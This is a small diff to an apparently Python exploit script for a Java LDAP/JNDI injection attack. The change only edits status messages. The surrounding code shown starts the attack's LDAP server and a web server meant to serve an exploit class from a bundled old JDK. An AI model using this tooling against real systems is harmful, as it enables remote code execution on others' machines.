@@ -93,7 +93,8 @@ public class Exploit {
     except Exception as e:
         print(Fore.RED + f'[-] Something went wrong {e.__str__()}')
     check_java_available()
-    print(Fore.GREEN + '[+] Setting up the LDAP and web server.', end="\n\n")
+    print(Fore.GREEN + '[+] Setting up the LDAP and web server.')
+    print(Fore.GREEN + f"[+] Starting the Web server on port {webport} http://0.0.0.0:{webport}", end="\n\n")
 
     # create the LDAP server on new thread
     t1 = threading.Thread(target=create_ldap_server, args=(user_ip, web_port))
@@ -102,7 +103,6 @@ public class Exploit {
     # start the web server
     httpd = HTTPServer(('0.0.0.0', int(web_port)), SimpleHTTPRequestHandler)
     httpd.serve_forever()
-
 
 def check_java_available():
     java_version = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
